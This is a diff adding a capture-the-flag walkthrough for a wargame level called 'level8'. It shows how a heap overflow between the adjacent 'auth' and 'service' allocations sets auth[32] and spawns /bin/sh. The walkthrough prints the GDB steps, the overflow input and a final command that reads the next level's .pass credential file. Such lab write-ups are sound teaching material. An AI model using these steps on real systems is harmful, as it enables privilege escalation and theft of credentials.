@@ -1,0 +1,98 @@
+# Level8 - Heap Overflow via Adjacent Allocations
+
+---
+
+# Walkthrough
+
+## Step 1: Test the program
+
+```bash
+./level8
+(nil), (nil)
+hello
+(nil), (nil)
+test
+(nil), (nil)
+```
+
+Program shows two pointers and waits for input. Random inputs do nothing.
+
+## Step 2: Find valid commands in GDB
+
+```bash
+gdb level8
+(gdb) disas main
+```
+
+Look for string comparisons, then check what strings:
+
+```bash
+(gdb) x/s 0x8048819
+"auth "
+
+(gdb) x/s 0x804882d
+"login"
+
+(gdb) x/s 0x8048833
+"/bin/sh"
+```
+
+**Commands found:** `auth`, `service`, `login`, `reset`
+
+## Step 3: Test the commands
+
+```bash
+./level8
+(nil), (nil)
+auth 
+0x804a008, (nil)
+service
+0x804a008, 0x804a018
+login
+Segmentation fault
+```
+
+- `auth ` creates first pointer at `0x804a008`
+- `service` creates second pointer at `0x804a018`
+- `login` crashes
+
+## Step 4: Analyze the login condition
+
+In disassembly:
+
+```asm
+mov    0x8049aac,%eax      ; Load auth pointer
+mov    0x20(%eax),%eax     ; Read auth[32] (0x20 = 32)
+test   %eax,%eax           ; Is it zero?
+je     no_shell            ; If zero, no shell
+call   system("/bin/sh")   ; If not zero, SHELL!
+```
+
+**Condition:** `auth[32] != 0` gives shell.
+
+## Step 5: Build the exploit
+
+`auth` is at `0x804a008`.
+`service` is at `0x804a018`.
+Distance: 16 bytes.
+
+We need to write to `auth[32]` = `0x804a008 + 32` = `0x804a028`.
+
+If `service` has enough data, it reaches `0x804a028`.
+
+```bash
+./level8
+auth 
+serviceAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+login
+```
+
+## Step 6: Get the flag
+
+```bash
+$ whoami
+level9
+$ cat /home/user/level9/.pass
+```
+
+---
